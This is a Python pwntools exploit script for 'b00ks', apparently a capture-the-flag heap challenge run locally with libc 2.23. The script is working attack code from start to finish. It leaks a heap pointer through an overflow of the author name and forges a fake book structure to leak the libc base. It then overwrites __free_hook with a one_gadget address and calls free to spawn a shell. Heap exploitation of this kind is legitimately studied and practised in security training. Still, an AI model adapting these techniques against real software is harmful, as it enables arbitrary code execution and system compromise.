#!/usr/bin/env python

from pwn import *

#context.log_level = 'debug'

io = process(['./b00ks'], env={'LD_PRELOAD':'./libc-2.23.so'})
libc = ELF('libc-2.23.so')

def Create(nsize, name, dsize, desc):
    io.sendlineafter("> ", '1')
    io.sendlineafter("name size: ", str(nsize))
    io.sendlineafter("name (Max 32 chars): ", name)
    io.sendlineafter("description size: ", str(dsize))
    io.sendlineafter("description: ", desc)

def Delete(idx):
    io.sendlineafter("> ", '2')
    io.sendlineafter("delete: ", str(idx))

def Edit(idx, desc):
    io.sendlineafter("> ", '3')
    io.sendlineafter("edit: ", str(idx))
    io.sendlineafter("description: ", desc)

def Print():
    io.sendlineafter("> ", '4')

def Change(name):
    io.sendlineafter("> ", '5')
    io.sendlineafter("name: ", name)

def leak_heap():
    global book2_addr

    io.sendlineafter("name: ", "A" * 0x20)
    Create(0xd0, "AAAA", 0x20, "AAAA")          # book1
    Create(0x21000, "AAAA", 0x21000, "AAAA")    # book2

    Print()
    io.recvuntil("A"*0x20)
    book1_addr = u64(io.recvn(6).ljust(8, "\x00"))
    book2_addr = book1_addr + 0x30

    log.info("book2 address: 0x%x" % book2_addr)

def leak_libc():
    global libc_base

    fake_book = p64(1) + p64(book2_addr + 0x8) * 2 + p64(0x20)
    Edit(1, fake_book)
    Change("A" * 0x20)

    Print()
    io.recvuntil("Name: ")
    leak_addr = u64(io.recvn(6).ljust(8, "\x00"))
    libc_base = leak_addr - 0x5ca010        # mmap_addr - libc_base

    log.info("libc address: 0x%x" % libc_base)

def overwrite():
    free_hook = libc.symbols['__free_hook'] + libc_base
    one_gadget = libc_base + 0x4526a

    fake_book = p64(free_hook) * 2
    Edit(1, fake_book)
    fake_book = p64(one_gadget)
    Edit(2, fake_book)

def pwn():
    Delete(2)

    io.interactive()

if __name__ == "__main__":
    leak_heap()
    leak_libc()
    overwrite()
    pwn()
